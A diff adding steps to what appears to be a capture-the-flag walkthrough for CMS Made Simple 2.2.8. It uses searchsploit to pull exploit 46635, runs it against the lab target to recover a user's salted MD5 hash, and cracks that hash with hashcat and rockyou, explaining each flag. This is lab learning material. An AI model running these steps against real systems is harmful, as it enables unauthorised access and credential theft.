@@ -60,7 +60,7 @@ We will run below command to know *CVE*
 ```
 searchsploit -x <path>
 ```
-
+You will got the cve number and that your answer for the Q3.
 
 
 We will use it with msfconsole. I immediately started msfconsole and serch by the command **seach cms 2.2.8**. 
@@ -81,4 +81,70 @@ After this command we will get a bunch of result
 
 <msf_bunch>
 
+We are now going to do a perfect search with
+```
+searchsploit cms made simple 2.2.8
+```
 
+We will now get only 1 result with its path we are going to use it by the command
+```
+seachsploit -m 46635
+```
+Now it gets copied into your current location.
+
+The syntax to use this exploit is pyhon2 46635.py -u http://<room_ip>/simple
+
+<exploit_use>
+
+Now we have the password hash for the user mitch.
+
+We can try to dehash the password with hashcat.
+
+We are going to use: -
+```
+hashcat -O -a 0 -m 10 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
+```
+The structure of command is hashcat [options] [options_values] [hash(es):salt] [wordlist/mask]
+
+```
+Command explanation: 
+
+1. -O flag
+
+    Optimized kernel mode
+
+    Enables faster cracking
+
+2. -a 0
+
+    Attack mode
+
+    0 = Straight (dictionary) attack
+      Hashcat will take each word from the wordlist and try it as a password
+
+3. -m 10
+
+ Hash type
+
+   10 = md5($pass.$salt)
+
+ 👉 This means:
+
+ The password is concatenated with the salt
+ Then hashed using MD5
+
+ Formula:
+
+  hash = MD5(password + salt)
+
+4. 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
+
+    This is the hash + salt pair
+
+5. /usr/share/wordlists/rockyou.txt
+
+    This is our wordlist (dictionary)
+
+6. 
+
+```
